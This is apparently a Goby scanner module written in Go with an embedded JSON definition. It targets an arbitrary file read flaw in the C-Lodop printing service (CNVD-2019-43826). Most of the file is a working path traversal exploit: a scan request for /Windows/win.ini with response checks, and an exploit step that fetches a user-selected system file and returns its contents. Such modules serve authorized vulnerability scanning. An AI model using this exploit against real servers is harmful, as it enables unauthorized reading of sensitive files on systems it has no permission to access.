package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "C-Lodop Arbitrary File Read (CNVD-2019-43826)",
    "Description": "There is an arbitrary file reading vulnerability in C-Lodop Printing Service System, which can be used by attackers to obtain sensitive information.",
    "Product": "C-lodop Printing Service System",
    "Homepage": "http://www.lodop.net/",
    "DisclosureDate": "2021-05-26",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "title=\"C-Lodop\"",
    "Level": "2",
    "Impact": "<p>An attacker can use this vulnerability to obtain sensitive information</p>",
    "Recommendation": "<p>Suggestion 1: update the software to version 4.0 and above</p><p>Suggestion 2: adopt the \"limited white list\" access mode provided by the software</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2019-43826"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "select",
            "value": "/Windows/win.ini,/Windows/System32/drivers/etc/HOSTS",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/../../../../../../../../../../Windows/win.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "font",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "extensions",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "file",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/../../../../../../{{{file}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6820"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
